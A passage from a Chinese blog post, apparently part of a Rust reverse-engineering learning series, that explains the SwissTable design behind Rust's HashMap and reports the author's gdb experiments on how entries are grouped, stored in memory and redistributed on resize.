<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[inline]</span></span><br><span class="line"><span class="meta">#[allow(clippy::cast_possible_truncation)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">h2</span>(hash: <span class="type">u64</span>) <span class="punctuation">-&gt;</span> <span class="type">u8</span> &#123;</span><br><span class="line">    <span class="comment">// Grab the top 7 bits of the hash. While the hash is normally a full 64-bit</span></span><br><span class="line">    <span class="comment">// value, some hash functions (such as FxHash) produce a usize result</span></span><br><span class="line">    <span class="comment">// instead, which means that the top 32 bits are 0 on 32-bit platforms.</span></span><br><span class="line">    <span class="comment">// So we use MIN_HASH_LEN constant to handle this.</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">top7</span> = hash &gt;&gt; (MIN_HASH_LEN * <span class="number">8</span> - <span class="number">7</span>);</span><br><span class="line">    (top7 &amp; <span class="number">0x7f</span>) <span class="keyword">as</span> <span class="type">u8</span> <span class="comment">// truncation</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>破案了，这里获取了hash的最高7位，经过调试证实，堆空间中一串0xFF中间掺杂的其他数据就是这些Hash值的最高7位。通过这个方法名，实际上已经可以在网上找到这个HashMap的算法了——Swiss Tables。经过简单了解后发现，它与Rust中的实现高度吻合。这是一种较新的高效HashMap算法，需要保存Key和Value本身，通过若干个16字节大小的桶进行索引。具体的算法实现可见<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/277732297">传送门</a>，下面也将进行简单介绍。</p>
<h2 id="swiss-tables"><a class="markdownIt-Anchor" href="#swiss-tables"></a> Swiss Tables</h2>
<h3 id="data-structure"><a class="markdownIt-Anchor" href="#data-structure"></a> Data Structure</h3>
<p>这个算法包含两个最为重要的数据结构，第一是若干个Group，每一个Group都是一个长度固定为16的数组，所有元素均为键值对，这里称每一个数组项为桶（Bucket）。第二是控制字节（Control Bytes）数组，对于每一个Group中的每一个元素，都有一个1字节的控制字节，因此控制字节数组的字节数量等于Group数量乘以16。</p>
<p>在这个算法中，需要对Hash进行如下操作：将Hash值截为无符号64位值（Rust中如果使用默认Hash算法，其输出就是无符号64位值，因此无需截断），随后分为最高7位与余下的57位。最高7位将被用来填充保存该元素的桶的控制字节的低7位，最高1位另有作用。余下的57位将用于确定将这个值保存在哪个Group中。在Rust中，控制字节为全1代表这个桶为空，为128代表这个桶被删除。</p>
<p>为方便说明，下面的所有图中，以绿色代表桶空，黄色代表满，红色代表已删除。</p>
<p><img src="1.png" alt="" /></p>
<h3 id="insertdeletefind"><a class="markdownIt-Anchor" href="#insertdeletefind"></a> Insert/Delete/Find</h3>
<p>那么这里就出现了一个问题：如果57位只是用来确定应该保存在哪个组，那么应该如何确定保存到组中的哪个桶呢？实际上这个问题根本不需要考虑，因为Swiss Tables充分考虑了现代CPU浮点数架构的性能优化，对于一个组，它的控制字节一共16字节，正好是一个浮点寄存器的大小，在实际实现的时候可以通过使用浮点数指令来进行加速，无论元素被保存到一个组中的哪个桶，都能够在固定的时间完成对一组的查找下面通过查找来简单说明。</p>
<p>如果需要查找某个Key，首先计算Hash值，随后获取高7位与其应该保存到的组的索引值，为方便说明，假设高7位为0x18。下面首先要完成的工作是尝试匹配高7字节，即在这个桶的16字节中尝试找到一个字节的值为0x18。找到之后还需要进一步比较Key值是否真的相等，因为7字节的空间很小容易发生碰撞。如果没有匹配到，需要判断这个组是否已经填满。因为Swiss Tables的插入规则中包含这样一条：当目标组已满时，需要判断该组的下一个组是否全满，如果不是则保存到下一个组，如果是则继续向下查找。也就是说，在查找的时候如果发现目标组已经填满且组中没有找到Key，则还需要向下查找下面的组，直到查找到Key或检测到某个组不是全满为止。</p>
<p><img src="2.png" alt="" /></p>
<p>以上图为例，如果现在需要查找3这个Key，Hash高7位为0x18，计算出的Hash值表示它应该被保存到组1中。但在插入时由于组1已满，因此被插入到组2中。在查找时，可首先通过一条浮点数指令将1个字节的值复制到16个字节的浮点数寄存器中，使浮点数寄存器的16个字节的值都等于0x18，随后使用两条浮点数指令将16个控制字节与浮点数寄存器进行逐字节比较获取16字节输出，相同的字节在输出中对应为值1，不同为0。最后获取到所有控制字节匹配的桶，进行Key的比较。</p>
<p>在上图的例子中，对组1进行匹配时发现没有找到3，且注意到这个组全满，因此需要继续匹配下面一组，在下面一组中找到了3这个Key，查找完成，Hit。</p>
<p>如果要查找6这个Key，且它的Hash值高7位也是0x18，那么在查找到组2没有找到后，还需要查找组3，组3中也没有，但组3不是全满，因此判断HashMap中不存在6这个Key，Miss。</p>
<p>从上面的分析可以看出，Swiss Tables在插入时遵循线性探测规则。根据上面所述的规则，我们能够基本完成对HashMap的插入、删除与查询操作。</p>
<p>不过上面的查找算法还有一个问题需要解决：对于已经删除的项，是应该将其视作满还是空？考虑一下：如果将删除项视作空，那么对于一堆全满的连续的多个组，在每个组中都可能保存有原本应该保存在这一堆中第一个组的元素，却因为前面的组都满了而被赶到了后面保存，将其视作空就相当于是减少了连续的全满的组的数量，假设有原本应该保存在组1的元素a被保存到组4，而组3删除了一个元素，那么在查找a的时候，只是找到组3就会退出，这样显然是错误的。因此查找时，对于已删除元素，应将其看做桶满。</p>
<h3 id="expand"><a class="markdownIt-Anchor" href="#expand"></a> Expand</h3>
<p>下面，我们还需要解决这个算法中的一个重要部分：扩容。如果所有组中空闲桶数量不足需要扩充，扩充前后同一个元素的Hash值计算出来应该保存到的组的索引有可能不同，这样原本应该保存到同一个组的元素可能会保存到相距很远的不同组中。举例说明，如果后57位确定组是通过将值对组数取模得到，那么对于一个原来有4组的HashMap，将其扩充到8组后，Hash值为0x5的数据在扩容前应该被保存到组1，但扩容后则会被保存到组5。扩容后若进行查找，也是从组5开始查找，此时无法查找到组1的这个数据。这个问题如何解决？如果组的数量没有即使扩充，当产生的连续全满组数量较多时，有可能会导致一次查找需要遍历所有这些全满组，导致效率有所降低，这个问题如何解决？</p>
<p>千言万语都说明，我们需要一个正确的高效的扩容算法。但很可惜的是，扩容算法的解释在网络中几乎没有，针对Swiss Tables的介绍大多是针对前面三种操作以及分析其查询效率为什么高。那么下面，我们将通过实际的试验验证Rust中HashMap的扩容策略。</p>
<p>首先，我们需要明确Rust HashMap在什么时候扩容。通过查看Rust源码发现了这样一个方法：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">bucket_mask_to_capacity</span>(bucket_mask: <span class="type">usize</span>) <span class="punctuation">-&gt;</span> <span class="type">usize</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> bucket_mask &lt; <span class="number">8</span> &#123;</span><br><span class="line">        <span class="comment">// For tables with 1/2/4/8 buckets, we always reserve one empty slot.</span></span><br><span class="line">        <span class="comment">// Keep in mind that the bucket mask is one less than the bucket count.</span></span><br><span class="line">        bucket_mask</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// For larger tables we reserve 12.5% of the slots as empty.</span></span><br><span class="line">        ((bucket_mask + <span class="number">1</span>) / <span class="number">8</span>) * <span class="number">7</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从注释中可以看出，对于桶数量为1/2/4/8的HashMap，Rust总是保留一个空的桶，而更大的HashMap则保留1/8的桶为空。这一点可以通过反复调用HashMap的<code>capacity</code>方法找到端倪。当我们一个个插入数据的时候，输出的capacity去重后是这样一个序列：3, 7, 14(16x7÷8), 28(32x7÷8), 56(64x7÷8), …。</p>
<p>接下来，这里重点探究一下Rust HashMap在扩容前后数据位置的变化情况。笔者本来是想通过直接搜索源码查找相关代码的，但找了半天无功而返，因此只得寻求动态调试的帮助。结果很简单就找到了，但是不知道为什么，调试显示的行与实际行不同。下面找到了一个resize，但是看不懂：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsafe</span> <span class="keyword">fn</span> <span class="title function_">resize</span>(</span><br><span class="line">    &amp;<span class="keyword">mut</span> <span class="keyword">self</span>,</span><br><span class="line">    capacity: <span class="type">usize</span>,</span><br><span class="line">    hasher: <span class="keyword">impl</span> <span class="title class_">Fn</span>(&amp;T) <span class="punctuation">-&gt;</span> <span class="type">u64</span>,</span><br><span class="line">    fallibility: Fallibility,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;(), TryReserveError&gt; &#123;</span><br><span class="line">    <span class="comment">// SAFETY:</span></span><br><span class="line">    <span class="comment">// 1. The caller of this function guarantees that `capacity &gt;= self.table.items`.</span></span><br><span class="line">    <span class="comment">// 2. We know for sure that `alloc` and `layout` matches the [`Allocator`] and</span></span><br><span class="line">    <span class="comment">//    [`TableLayout`] that were used to allocate this table.</span></span><br><span class="line">    <span class="comment">// 3. The caller ensures that the control bytes of the `RawTableInner`</span></span><br><span class="line">    <span class="comment">//    are already initialized.</span></span><br><span class="line">    <span class="keyword">self</span>.table.<span class="title function_ invoke__">resize_inner</span>(</span><br><span class="line">        &amp;<span class="keyword">self</span>.alloc,</span><br><span class="line">        capacity,</span><br><span class="line">        &amp;|table, index| <span class="title function_ invoke__">hasher</span>(table.bucket::&lt;T&gt;(index).<span class="title function_ invoke__">as_ref</span>()),</span><br><span class="line">        fallibility,</span><br><span class="line">        <span class="keyword">Self</span>::TABLE_LAYOUT,</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[allow(clippy::inline_always)]</span></span><br><span class="line"><span class="meta">#[inline(always)]</span></span><br><span class="line"><span class="keyword">unsafe</span> <span class="keyword">fn</span> <span class="title function_">resize_inner</span>&lt;A&gt;(</span><br><span class="line">    &amp;<span class="keyword">mut</span> <span class="keyword">self</span>,</span><br><span class="line">    alloc: &amp;A,</span><br><span class="line">    capacity: <span class="type">usize</span>,</span><br><span class="line">    hasher: &amp;<span class="keyword">dyn</span> <span class="title function_ invoke__">Fn</span>(&amp;<span class="keyword">mut</span> <span class="keyword">Self</span>, <span class="type">usize</span>) <span class="punctuation">-&gt;</span> <span class="type">u64</span>,</span><br><span class="line">    fallibility: Fallibility,</span><br><span class="line">    layout: TableLayout,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;(), TryReserveError&gt;</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    A: Allocator,</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// SAFETY: We know for sure that `alloc` and `layout` matches the [`Allocator`] and [`TableLayout`]</span></span><br><span class="line">    <span class="comment">// that were used to allocate this table.</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">new_table</span> = <span class="keyword">self</span>.<span class="title function_ invoke__">prepare_resize</span>(alloc, layout, capacity, fallibility)?;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SAFETY: We know for sure that RawTableInner will outlive the</span></span><br><span class="line">    <span class="comment">// returned `FullBucketsIndices` iterator, and the caller of this</span></span><br><span class="line">    <span class="comment">// function ensures that the control bytes are properly initialized.</span></span><br><span class="line">    <span class="keyword">for</span> <span class="variable">full_byte_index</span> <span class="keyword">in</span> <span class="keyword">self</span>.<span class="title function_ invoke__">full_buckets_indices</span>() &#123;</span><br><span class="line">        <span class="comment">// This may panic.</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">hash</span> = <span class="title function_ invoke__">hasher</span>(<span class="keyword">self</span>, full_byte_index);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// SAFETY:</span></span><br><span class="line">        <span class="comment">// We can use a simpler version of insert() here since:</span></span><br><span class="line">        <span class="comment">// 1. There are no DELETED entries.</span></span><br><span class="line">        <span class="comment">// 2. We know there is enough space in the table.</span></span><br><span class="line">        <span class="comment">// 3. All elements are unique.</span></span><br><span class="line">        <span class="comment">// 4. The caller of this function guarantees that `capacity &gt; 0`</span></span><br><span class="line">        <span class="comment">//    so `new_table` must already have some allocated memory.</span></span><br><span class="line">        <span class="comment">// 5. We set `growth_left` and `items` fields of the new table</span></span><br><span class="line">        <span class="comment">//    after the loop.</span></span><br><span class="line">        <span class="comment">// 6. We insert into the table, at the returned index, the data</span></span><br><span class="line">        <span class="comment">//    matching the given hash immediately after calling this function.</span></span><br><span class="line">        <span class="keyword">let</span> (new_index, _) = new_table.<span class="title function_ invoke__">prepare_insert_slot</span>(hash);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// SAFETY:</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// * `src` is valid for reads of `layout.size` bytes, since the</span></span><br><span class="line">        <span class="comment">//   table is alive and the `full_byte_index` is guaranteed to be</span></span><br><span class="line">        <span class="comment">//   within bounds (see `FullBucketsIndices::next_impl`);</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// * `dst` is valid for writes of `layout.size` bytes, since the</span></span><br><span class="line">        <span class="comment">//   caller ensures that `table_layout` matches the [`TableLayout`]</span></span><br><span class="line">        <span class="comment">//   that was used to allocate old table and we have the `new_index`</span></span><br><span class="line">        <span class="comment">//   returned by `prepare_insert_slot`.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// * Both `src` and `dst` are properly aligned.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// * Both `src` and `dst` point to different region of memory.</span></span><br><span class="line">        ptr::<span class="title function_ invoke__">copy_nonoverlapping</span>(</span><br><span class="line">            <span class="keyword">self</span>.<span class="title function_ invoke__">bucket_ptr</span>(full_byte_index, layout.size),</span><br><span class="line">            new_table.<span class="title function_ invoke__">bucket_ptr</span>(new_index, layout.size),</span><br><span class="line">            layout.size,</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The hash function didn&#x27;t panic, so we can safely set the</span></span><br><span class="line">    <span class="comment">// `growth_left` and `items` fields of the new table.</span></span><br><span class="line">    new_table.growth_left -= <span class="keyword">self</span>.items;</span><br><span class="line">    new_table.items = <span class="keyword">self</span>.items;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// We successfully copied all elements without panicking. Now replace</span></span><br><span class="line">    <span class="comment">// self with the new table. The old table will have its memory freed but</span></span><br><span class="line">    <span class="comment">// the items will not be dropped (since they have been moved into the</span></span><br><span class="line">    <span class="comment">// new table).</span></span><br><span class="line">    <span class="comment">// SAFETY: The caller ensures that `table_layout` matches the [`TableLayout`]</span></span><br><span class="line">    <span class="comment">// that was used to allocate this table.</span></span><br><span class="line">    mem::<span class="title function_ invoke__">swap</span>(<span class="keyword">self</span>, &amp;<span class="keyword">mut</span> new_table);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>写到这里，笔者已经被这个问题纠缠了两周，不堪忍受的我决定开始人肉找规律，将所有的Hash值转换为二进制，看看归于同一组的Hash到底有什么相同之处。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Inserted 1, hash = 33bd1e335a4e43f0, h2 = 19, map capacity = 3</span><br><span class="line">Inserted 3, hash = 56303fd171416940, h2 = 2b, map capacity = 3</span><br><span class="line">Inserted 15, hash = cde8088c422f9d0, h2 = 6, map capacity = 3</span><br><span class="line">Inserted 22, hash = 411807d47ecb5b61, h2 = 20, map capacity = 7</span><br><span class="line">Inserted 23, hash = bbf28bf43ce33881, h2 = 5d, map capacity = 7</span><br><span class="line">Inserted 45, hash = 217bed8f242fc391, h2 = 10, map capacity = 7</span><br><span class="line">Inserted 46, hash = d97613d73c3edd81, h2 = 6c, map capacity = 7</span><br><span class="line">Inserted 48, hash = ec9ec7fbb5226711, h2 = 76, map capacity = e</span><br><span class="line">Inserted 53, hash = ea21590131a0aad0, h2 = 75, map capacity = e</span><br><span class="line">Inserted 55, hash = 6e28ebd650236d51, h2 = 37, map capacity = e</span><br><span class="line">Inserted 59, hash = 263478baaf15b7f1, h2 = 13, map capacity = e</span><br><span class="line">Inserted 60, hash = 2aebb2b8fdb4f070, h2 = 15, map capacity = e</span><br><span class="line">Inserted 73, hash = 163193d2c2c5b7c1, h2 = b, map capacity = e</span><br><span class="line">Inserted 78, hash = a8f5a0a55cea2e21, h2 = 54, map capacity = e</span><br><span class="line">Inserted 85, hash = dbe1512d01714890, h2 = 6d, map capacity = 1c</span><br><span class="line">Inserted 87, hash = 1159a3327874fea1, h2 = 8, map capacity = 1c</span><br><span class="line"></span><br><span class="line">22:0110│  0x5555555bdf40 ◂— 0x1513377576100619</span><br><span class="line">23:0118│  0x5555555bdf48 ◂— 0xffffffffffffff6d</span><br><span class="line">24:0120│  0x5555555bdf50 ◂— 0xff08540b6c5d202b</span><br><span class="line">25:0128│  0x5555555bdf58 ◂— 0xffffffffffffffff</span><br><span class="line"></span><br><span class="line">0011 0011 1011 1101 0001 1110 0011 0011 0101 1010 0100 1110 0100 0011 1111 0000</span><br><span class="line">0000 1100 1101 1110 1000 0000 1000 1000 1100 0100 0010 0010 1111 1001 1101 0000</span><br><span class="line">0010 0001 0111 1011 1110 1101 1000 1111 0010 0100 0010 1111 1100 0011 1001 0001</span><br><span class="line">1110 1100 1001 1110 1100 0111 1111 1011 1011 0101 0010 0010 0110 0111 0001 0001</span><br><span class="line">1110 1010 0010 0001 0101 1001 0000 0001 0011 0001 1010 0000 1010 1010 1101 0000</span><br><span class="line">0110 1110 0010 1000 1110 1011 1101 0110 0101 0000 0010 0011 0110 1101 0101 0001</span><br><span class="line">0010 0110 0011 0100 0111 1000 1011 1010 1010 1111 0001 0101 1011 0111 1111 0001</span><br><span class="line">0010 1010 1110 1011 1011 0010 1011 1000 1111 1101 1011 0100 1111 0000 0111 0000</span><br><span class="line">1101 1011 1110 0001 0101 0001 0010 1101 0000 0001 0111 0001 0100 1000 1001 0000</span><br><span class="line"></span><br><span class="line">0101 0110 0011 0000 0011 1111 1101 0001 0111 0001 0100 0001 0110 1001 0100 0000</span><br><span class="line">0100 0001 0001 1000 0000 0111 1101 0100 0111 1110 1100 1011 0101 1011 0110 0001</span><br><span class="line">1011 1011 1111 0010 1000 1011 1111 0100 0011 1100 1110 0011 0011 1000 1000 0001</span><br><span class="line">1101 1001 0111 0110 0001 0011 1101 0111 0011 1100 0011 1110 1101 1101 1000 0001</span><br><span class="line">0001 0110 0011 0001 1001 0011 1101 0010 1100 0010 1100 0101 1011 0111 1100 0001</span><br><span class="line">1010 1000 1111 0101 1010 0000 1010 0101 0101 1100 1110 1010 0010 1110 0010 0001</span><br><span class="line">0001 0001 0101 1001 1010 0011 0011 0010 0111 1000 0111 0100 1111 1110 1010 0001</span><br></pre></td></tr></table></figure>
<p>上面最后的几大行二进制数据中，上面的是保存到第一组的Hash，下面的是保存到第二组的Hash，看出来有什么规律了吗？可以发现，上面的Hash中所有的第5低的bit均为1，下面的均为0。为了严谨考虑，笔者增加了数据量进行了进一步测试，发现当组数为4时，是按照第5低bit和第6低bit来判断一个数据应该被分到哪组。</p>
<p>至此，我们最终通过实验获知了Rust中的HashMap的分组方式，与传统的SwissTable不同，分组的标志位从第5低bit开始，这也是为什么笔者一开始找了很长时间源码与规律依然一无所获。</p>
<p>下面是笔者的测试程序，读者可以将这个程序编译后通过gdb调试进行HashMap内存空间的一一比对。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::collections::HashMap;</span><br><span class="line"><span class="keyword">use</span> std::hash::&#123;BuildHasher, Hash, Hasher&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rs</span> = std::collections::hash_map::RandomState::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">map</span>: HashMap&lt;<span class="type">u64</span>, <span class="type">u64</span>&gt; = HashMap::<span class="title function_ invoke__">with_hasher</span>(rs);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">ctr</span> = [<span class="number">0</span>;<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="number">0</span>..<span class="number">1000u64</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">hasher</span> = map.<span class="title function_ invoke__">hasher</span>().<span class="title function_ invoke__">build_hasher</span>();</span><br><span class="line">        i.<span class="title function_ invoke__">hash</span>(&amp;<span class="keyword">mut</span> hasher);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">hash</span> = hasher.<span class="title function_ invoke__">finish</span>();</span><br><span class="line">        <span class="keyword">if</span> ctr[(hash <span class="keyword">as</span> <span class="type">usize</span> &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span>] == <span class="number">13</span> &#123; <span class="keyword">continue</span> &#125;</span><br><span class="line">        <span class="keyword">if</span> ctr[<span class="number">0</span>] + ctr[<span class="number">1</span>] + ctr[<span class="number">2</span>] + ctr[<span class="number">3</span>] == <span class="number">13</span> * <span class="number">4</span> &#123; <span class="keyword">break</span> &#125;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">h2</span> = hash &gt;&gt; <span class="number">57</span>;</span><br><span class="line">        map.<span class="title function_ invoke__">insert</span>(i, i);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Inserted &#123;i:&lt;02&#125;, hash = &#123;hash:&lt;064b&#125;, h1(suspected) = &#123;:x&#125;, h2 = &#123;:x&#125;, map capacity = &#123;:x&#125;&quot;</span>,</span><br><span class="line">                 (hash &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span>, h2, map.<span class="title function_ invoke__">capacity</span>());</span><br><span class="line">        ctr[(hash <span class="keyword">as</span> <span class="type">usize</span> &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span>] += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Finished!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在实际测试过程中，当数据量较大时，经常需要线性后移，即当前组已满，需要将Hash值移动到后面一个组中。实际调试时发现，一个组中似乎最多只会保存15个数据而不是填充满，在几次调试后均未发现填充满的组。</p>
<p>另外需要注意的是，在保存HashMap的堆Chunk中，数据的排布方式有一些独特。数据保存在SwissTable之前，设SwissTable的起始地址为x，那么x+i处标志字节所对应的数据地址位于x-sizeof(key+value)*i，笔者猜测这样是为了便于Rust进行寻址，因为对HashMap的操作中，普遍是传入的SwissTable地址而非数据的起始地址，这样可以在不知道数据起始地址的情况下快速对应到数据。而对于SwissTable，若实际的组数为2<sup>n</sup>，那么保存到堆中的组应该为2<sup>n</sup>+1，最后一组与第一组的数据相同。这可能是为了在最后一组满且需要保存数据时能够快速检测到需要遍历到第一组添加数据。</p>
<h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>
<p>本文的信息量比较大，下面我们来简单总结一下。</p>
<ul>
<li>对于Rust，其HashMap的底层实现是SwissTable，这是一种高效的HashMap算法。</li>
<li>Rust在HashMap中使用的默认Hash算法是SipHash算法。</li>
<li>Rust会保证所有组至少留出1/8的空闲空间，如果下一次添加数据打破了这一规则，Rust将对组进行扩充。</li>
<li>Rust将Hash去掉最低4位和最高7位，剩余的值作为组的索引值，其值对组数取模后的值即为一个键值对应该被保存的组号。如果组满则实行线性规则在后面的组中插入。</li>
<li>Rust在初始化HashMap时使用两个随机数作为Hash算法的参数，这使得相同的键值对在不同的HashMap中计算的Hash值也不同。</li>
<li>Rust的HashMap其余规则与SwissTable定义的规则没有什么太大的区别。</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/11/26/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/26/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-6/" class="post-title-link" itemprop="url">Rust逆向学习 (6)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-11-26 17:54:46 / 修改时间：23:16:09" itemprop="dateCreated datePublished" datetime="2023-11-26T17:54:46+08:00">2023-11-26</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
